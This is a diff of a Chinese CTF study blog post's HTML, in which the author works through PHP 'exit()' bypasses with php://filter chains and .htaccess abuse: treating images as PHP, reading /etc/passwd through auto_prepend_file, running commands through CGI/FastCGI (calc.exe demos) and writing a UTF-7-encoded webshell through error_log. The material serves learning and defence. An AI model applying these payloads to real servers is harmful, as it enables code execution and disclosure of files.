-<h4 id="php7先压缩再解压（测试有问题）"><a href="#php7先压缩再解压（测试有问题）" class="headerlink" title="php7先压缩再解压（测试有问题）"></a>php7先压缩再解压（测试有问题）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php&#x27;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="php7先压缩再解压（测试有问题）"><a href="#php7先压缩再解压（测试有问题）" class="headerlink" title="php7先压缩再解压（测试有问题）"></a>php7先压缩再解压（测试有问题）</h4><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=a.php&#x27;</span>;
+<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];
+<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>大佬的示例</p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065000143.png" srcset="/img/loading.gif" lazyload alt="image-20230902065000143"></p>
 <p>我的示例（php7.3.4和7.1.9都不行）</p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230902065554692.png" srcset="/img/loading.gif" lazyload alt="image-20230902065554692"></p>
 <p>呜呜，又与大佬不一样了</p>
-<h3 id="死亡代码变种"><a href="#死亡代码变种" class="headerlink" title="死亡代码变种"></a>死亡代码变种</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="死亡代码变种"><a href="#死亡代码变种" class="headerlink" title="死亡代码变种"></a>死亡代码变种</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$content</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];
+<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$content</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#插入无关代码在filename处正常解析</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php<br><br><span class="hljs-comment">#当文件名</span><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#插入无关代码在filename处正常解析</span>
+php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php
+
+<span class="hljs-comment">#当文件名</span>
+php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></pre></div>
 
 <p>和大佬说的一样，使用上述两个代码都只能创建文件，无法生成内容</p>
 <h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>写入的内容拼接起来是<code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p>
@@ -450,7 +609,12 @@
 <p>。。。好像错的更加彻底</p>
 <p><strong>真实情况</strong>（也是Boogipop大佬的理解）</p>
 <p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=a.php&#x27;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit()&lt;?;&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;a.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=a.php&#x27;</span>;
+<span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span>;
+<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;&lt;?php exit()&lt;?;&quot;</span>.<span class="hljs-variable">$content</span>);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;a.php&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>拼接后是<code>&lt;?php exit()&lt;?;?&gt;PD9waHAgcGhwaW5mbygpOz8+</code></p>
 <p>真实情况，只剩base64代码，然后base64解密</p>
@@ -473,7 +637,7 @@
 <p><code>windows</code>没有<code>iconv</code>，但是我是能成功写入内容的（不太理解）</p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112719444.png" srcset="/img/loading.gif" lazyload alt="image-20230903112719444"></p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903112735404.png" srcset="/img/loading.gif" lazyload alt="image-20230903112735404"></p>
-<h3 id="死亡代码变种（二）"><a href="#死亡代码变种（二）" class="headerlink" title="死亡代码变种（二）"></a>死亡代码变种（二）</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents($<span class="hljs-params">filename</span>, $<span class="hljs-params">content</span> . <span class="hljs-string">&quot;\nxxxxxx&quot;</span>)</span>;<br></code></pre></td></tr></table></figure>
+<h3 id="死亡代码变种（二）"><a href="#死亡代码变种（二）" class="headerlink" title="死亡代码变种（二）"></a>死亡代码变种（二）</h3><div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents($<span class="hljs-params">filename</span>, $<span class="hljs-params">content</span> . <span class="hljs-string">&quot;\nxxxxxx&quot;</span>)</span>;</code></pre></div>
 
 <p>因为<code>php</code>有特殊的起始符和结束符，所以出题时一般会被禁用php</p>
 <p>常见考点是利用<code>.htaccess</code>，<code>.htaccess</code>文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用<strong>注释符</strong>将杂糅的代码进行注释，然后才可以正常访问；</p>
@@ -506,13 +670,19 @@
 <p>（这里源码泄露的意思是）因为像<code>&lt;?php phpinfo();?&gt;</code>这样的php代码一般会被解析而无法显现，这里关闭解析，于是代码就会显示</p>
 <p>如：<code>php_flag engine off</code></p>
 <h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>#</code>一般放在行首，并且只能注释一行</p>
-<h4 id="多行注释-0a"><a href="#多行注释-0a" class="headerlink" title="多行注释         #%0a"></a>多行注释         #%0a</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_fi\<br>le <span class="hljs-number">1.</span>png<br># <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> 注释<br></code></pre></td></tr></table></figure>
+<h4 id="多行注释-0a"><a href="#多行注释-0a" class="headerlink" title="多行注释         #%0a"></a>多行注释         #%0a</h4><div class="code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_fi\
+le <span class="hljs-number">1.</span>png
+# <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> 注释</code></pre></div>
 
 <p>里面的<code>\</code>并不只是单单的<code>\</code>，他实际上是<code>\%0a、</code>，转义了换行符</p>
 <p>利用这种技巧用<code>#\%0a</code>来多行注释</p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="解析文件"><a href="#解析文件" class="headerlink" title="解析文件"></a>解析文件</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 将test.gif 当做 PHP 执行   </span><br><span class="hljs-section">&lt;FilesMatch  <span class="hljs-string">&quot;test.gif&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span>  application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="解析文件"><a href="#解析文件" class="headerlink" title="解析文件"></a>解析文件</h4><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># 将test.gif 当做 PHP 执行   </span>
+<span class="hljs-section">&lt;FilesMatch  <span class="hljs-string">&quot;test.gif&quot;</span>&gt;</span>
+<span class="hljs-attribute">SetHandler</span>  application/x-httpd-php
+<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div>
 
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 将 .png 当做 PHP 文件解析</span><br>AddType <span class="hljs-built_in">application</span>/x-httpd-php .png<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-comment"># 将 .png 当做 PHP 文件解析</span>
+AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre></div>
 
 <h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p><code>php_value auto_prepend_file /etc/passwd</code></p>
 <p>访问<code>php</code>文件时会先打开<code>/etc/passwd</code>   (<code>/etc/passwd</code>的内容在php文件内容前)</p>
@@ -525,47 +695,69 @@
 <p>在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码</p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122346792.png" srcset="/img/loading.gif" lazyload alt="image-20230903122346792"></p>
 <h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>条件：<code>all_url_fopen=on</code>,<code>all_url_include=on</code></p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_append_file data:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_append_file data:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span></code></pre></div>
 
-<h4 id="解析-htaccess"><a href="#解析-htaccess" class="headerlink" title="解析.htaccess"></a>解析.htaccess</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h4 id="解析-htaccess"><a href="#解析-htaccess" class="headerlink" title="解析.htaccess"></a>解析.htaccess</h4><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span>
+<span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span></code></pre></div>
 
 <p><code>&lt;?php phpinfo();?&gt;</code>会被解析</p>
 <p>这种方法在我们随便打开一个PHP文件后就会去解析.htaccess文件（这里的htaccess文件一定要和php文件在一个目录下！！！！）</p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903122707190.png" srcset="/img/loading.gif" lazyload alt="image-20230903122707190"></p>
 <p>二</p>
 <p>这种适合同目录或子目录没有<code>php</code>文件。<br>需要先设置允许可访问 <code>.htaccess</code> 文件</p>
-<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span></span><br><span class="language-xml"> Require all granted</span><br><span class="language-xml"> Order allow,deny</span><br><span class="language-xml"> Allow from all</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span><br><span class="language-xml">SetHandler application/x-httpd-php</span><br><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span></span>
+<span class="language-xml"> Require all granted</span>
+<span class="language-xml"> Order allow,deny</span>
+<span class="language-xml"> Allow from all</span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span>
+<span class="language-xml">SetHandler application/x-httpd-php</span>
+<span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span></code></pre></div>
 
 <p>上面的代码必须加，是允许访问htaccess文件</p>
 <h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h5><p><code>cgi_module</code> 需要加载，即 <code>apache</code> 配置文件中有</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> cgi_module modules/mod_cgi.so<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> cgi_module modules/mod_cgi.so</code></pre></div>
 
 <p>.htaccess内容</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options ExecCGI <span class="hljs-comment">#允许CGI执行</span><br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx <span class="hljs-comment">#将xx后缀名的文件，当做CGI程序进行解析</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs mipsasm">Options ExecCGI <span class="hljs-comment">#允许CGI执行</span>
+<span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xx <span class="hljs-comment">#将xx后缀名的文件，当做CGI程序进行解析</span></code></pre></div>
 
 <p>ce.xx</p>
-<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /k start calc.exe</span><br><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs d"><span class="hljs-meta">#!C:/Windows/System32/cmd.exe /k start calc.exe</span>
+<span class="hljs-number">6</span></code></pre></div>
 
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903123655129.png" srcset="/img/loading.gif" lazyload alt="image-20230903123655129"></p>
 <h5 id="fastcgi-（百闻不如一见）"><a href="#fastcgi-（百闻不如一见）" class="headerlink" title="fastcgi     （百闻不如一见）"></a>fastcgi     （百闻不如一见）</h5><p><code>mod_fcgid.so</code>需要被加载。即 <code>apache</code> 配置文件中有</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> fcgid_module modules/mod_fcgid.so<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> fcgid_module modules/mod_fcgid.so</code></pre></div>
 
 <p>.htaccess</p>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Options +ExecCGI<br>AddHandler fcgid-script <span class="hljs-string">.xx</span><br>FcgidWrapper <span class="hljs-string">&quot;C:/Windows/System32/cmd.exe /k start calc.exe&quot;</span> <span class="hljs-string">.xx</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs jboss-cli">Options +ExecCGI
+AddHandler fcgid-script <span class="hljs-string">.xx</span>
+FcgidWrapper <span class="hljs-string">&quot;C:/Windows/System32/cmd.exe /k start calc.exe&quot;</span> <span class="hljs-string">.xx</span></code></pre></div>
 
 <p>ce.xx 内容随意  （所以叫fast）</p>
 <h4 id="自定义错误文件-（不太理解）"><a href="#自定义错误文件-（不太理解）" class="headerlink" title="自定义错误文件   （不太理解）"></a>自定义错误文件   （不太理解）</h4><p><code>error.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;shell&#x27;</span>);<span class="hljs-comment">#报错页面</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;shell&#x27;</span>);<span class="hljs-comment">#报错页面</span></code></pre></div>
 
 <p><code>.htaccess</code></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/tmp/</span>www<span class="hljs-regexp">/html/</span>shell.php <br>php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/tmp/</span>www<span class="hljs-regexp">/html/</span>shell.php 
+php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span></code></pre></div>
 
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903124241964.png" srcset="/img/loading.gif" lazyload alt="image-20230903124241964"></p>
 <p>会经过 html 编码，所以需要 UTF-7 来绕过。</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 第一次</span><br>php_value error_log <span class="hljs-keyword">/tmp/</span>shell <span class="hljs-meta">#定义错误路径</span><br><span class="hljs-meta">#---- <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span> in UTF-7:</span><br>php_value include_path <span class="hljs-string">&quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><br><span class="hljs-meta"># 第二次</span><br>php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span> <span class="hljs-meta">#将<span class="hljs-keyword">include</span>()的默认路径改变</span><br>php_flag zend.multibyte <span class="hljs-number">1</span><br>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># 第一次</span>
+php_value error_log <span class="hljs-keyword">/tmp/</span>shell <span class="hljs-meta">#定义错误路径</span>
+<span class="hljs-meta">#---- <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span> in UTF-7:</span>
+php_value include_path <span class="hljs-string">&quot;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span>
+
+<span class="hljs-meta"># 第二次</span>
+php_value include_path <span class="hljs-string">&quot;/tmp&quot;</span> <span class="hljs-meta">#将<span class="hljs-keyword">include</span>()的默认路径改变</span>
+php_flag zend.multibyte <span class="hljs-number">1</span>
+php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre></div>
 
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11439994.html">X-NUCA-ezphp</a></p>
-<h2 id="session-serialize-handler-三种引擎"><a href="#session-serialize-handler-三种引擎" class="headerlink" title="session.serialize_handler(三种引擎)"></a>session.serialize_handler(三种引擎)</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">php</span>(默认的）	键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值<br>php_binary	   键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的值<br>php_serialize (php&gt;=<span class="hljs-number">5.5</span>.<span class="hljs-number">4</span>)	经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的数组<br></code></pre></td></tr></table></figure>
+<h2 id="session-serialize-handler-三种引擎"><a href="#session-serialize-handler-三种引擎" class="headerlink" title="session.serialize_handler(三种引擎)"></a>session.serialize_handler(三种引擎)</h2><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">php</span>(默认的）	键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
+php_binary	   键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的值
+php_serialize (php&gt;=<span class="hljs-number">5.5</span>.<span class="hljs-number">4</span>)	经过 <span class="hljs-built_in">serialize</span>() 函数反序列处理的数组</code></pre></div>
 
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144909405.png" srcset="/img/loading.gif" lazyload alt="image-20230903144909405"></p>
 <p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230903144926904.png" srcset="/img/loading.gif" lazyload alt="image-20230903144926904"></p>
@@ -636,6 +828,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/09/03/%E6%8F%92%E6%9B%B2/" title="插曲">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">插曲</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
